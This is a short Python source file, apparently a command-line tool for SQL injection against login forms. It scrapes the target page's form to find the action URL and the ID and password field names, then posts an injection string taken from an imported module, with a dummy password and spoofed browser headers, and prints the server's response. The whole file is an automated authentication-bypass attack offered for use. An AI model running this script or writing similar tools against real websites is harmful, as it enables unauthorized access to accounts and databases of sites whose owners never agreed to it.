import re
import sys
import requests
from bs4 import BeautifulSoup # beautifulsoup4
import sql_injection

import threading

def help():
    #
    # ./sql-injection url
    #
    #
    print('Usage: ./sql-injection url')
    sys.exit(1)

def getDomain(url):
    # Regex
    domainpattern = '^(https?:\/\/)?([\da-z\.-]+)'
    domain = re.compile(domainpattern).match(url).group()
    middle = re.sub('^(https?:\/\/)', "", domain)
    path = re.compile('^(https?:\/\/)?([\da-z\.-]+)\/([a-z\.-]+)').match(url).group()
    print("\nMiddle = " + middle + "\nDomain = " + domain)
    print("Current path = " + path)

    next_url = path + '/' + action_page
    topost = re.sub(domainpattern, "", next_url)
    print("Next URL = " + next_url + "\nFor post packet = " + topost)

    return domain, middle, next_url, topost

def getValues(url):

    # Get request
    r = requests.get(url).text
    soup = BeautifulSoup(r, 'html.parser')

    # Find next page, id and pw(transmit via POST method)
    form_tag = soup.form
    action_page = form_tag.get('action')
    id_value = soup.select('form input')[0]['name']
    pw_value = soup.select('form input')[1]['name']
    print("\n[[[[[ GET ]]]]]]")
    print("Action page = " + action_page + "\nID = " + id_value + "\nPW = " + pw_value)

    return action_page, id_value, pw_value



if(len(sys.argv)!=2):
    help()

url = str(sys.argv[1])
action_page, id_value, pw_value = getValues(url)
domain, middle, next_url, topost = getDomain(url)

# General SQL Injection
sqlinjection_mysql = sql_injection.sqlinjection()
print(sqlinjection_mysql)
data = {
    id_value:sqlinjection_mysql,
    pw_value:'dontcare'
}
header = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
}

# Send post packet
resp = requests.post(next_url, data=data, headers=header)
print("\n[[[[[ RESPONSE ]]]]]\n" + resp.text)

#t = httpget.MyThread()
#t.run()

#t2 = threading.Thread(target=sendPOSTpacket, args=(next_url, data, header))
#t2.daemon = True
#t2.start()
